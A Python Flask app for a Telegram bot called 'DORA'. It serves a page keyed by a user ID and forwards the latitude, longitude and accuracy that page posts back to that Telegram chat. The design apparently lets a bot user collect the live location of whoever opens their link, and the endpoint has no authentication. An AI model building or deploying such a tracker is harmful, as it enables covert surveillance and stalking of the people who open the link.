import os
import logging
from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")

@app.route('/')
def home():
    return "DORA WEB SITE is running! Use /start on Telegram bot."

@app.route('/loc/')
def location_page():
    """Main location page - /loc/?id=USER_ID"""
    user_id = request.args.get('id')
    if not user_id:
        return "Missing user ID. Please restart from bot.", 400
    return render_template('index.html', user_id=user_id)

@app.route('/send-location', methods=['POST'])
def send_location():
    """Web App එකෙන් location data එක Bot එකට send කරන endpoint"""
    data = request.get_json()
    user_id = data.get('user_id')
    lat = data.get('latitude')
    lon = data.get('longitude')
    accuracy = data.get('accuracy', 0)
    
    if not user_id or not lat or not lon:
        return jsonify({"status": "error", "message": "Missing data"}), 400
    
    # Send to Telegram Bot
    bot_api = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = (
        f"📍 *DORA LIVE LOCATION*\n\n"
        f"👤 User ID: `{user_id}`\n"
        f"🗺️ Latitude: `{lat}`\n"
        f"🌍 Longitude: `{lon}`\n"
        f"🎯 Accuracy: `{accuracy}m`\n\n"
        f"[🗺️ Open in Google Maps](https://www.google.com/maps?q={lat},{lon})"
    )
    
    try:
        requests.post(bot_api, json={
            "chat_id": user_id,
            "text": message,
            "parse_mode": "Markdown",
            "disable_web_page_preview": False
        }, timeout=10)
        logging.info(f"Location sent to user {user_id}: {lat}, {lon}")
        return jsonify({"status": "success"})
    except Exception as e:
        logging.error(f"Error sending to bot: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
